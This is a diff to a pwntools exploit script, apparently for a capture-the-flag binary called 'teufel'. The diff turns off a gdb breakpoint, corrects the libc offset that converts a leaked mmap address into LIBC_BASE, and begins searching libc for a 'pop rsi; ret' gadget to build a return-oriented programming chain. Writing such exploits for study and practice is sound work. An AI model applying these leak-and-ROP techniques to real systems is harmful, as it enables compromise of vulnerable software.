@@ -15,10 +15,10 @@ context.log_level = 'info'
 
 #r = remote('localhost', 8888)
 r = process('./teufel')
-gdb.attach(r, '''
-b *0x400532
-'''
-)
+#gdb.attach(r, '''
+#b *0x400532
+#'''
+#)
 #raw_input('Go!')
 
 # strace: 
@@ -53,9 +53,9 @@ if __name__ == "__main__":
 
     log.info('mapped memory: %#x' % mmap)
 
-# 0x5ea000 is from leak.py 
+# the offset is from leak.py 
 
-    LIBC_BASE = mmap - 0x5ea000
+    LIBC_BASE = mmap - 0x5ec000
     log.info('LIBC_BASE: %#x' % LIBC_BASE)
 
     POP_RSI = libc.search(asm('pop rsi; ret')).next()
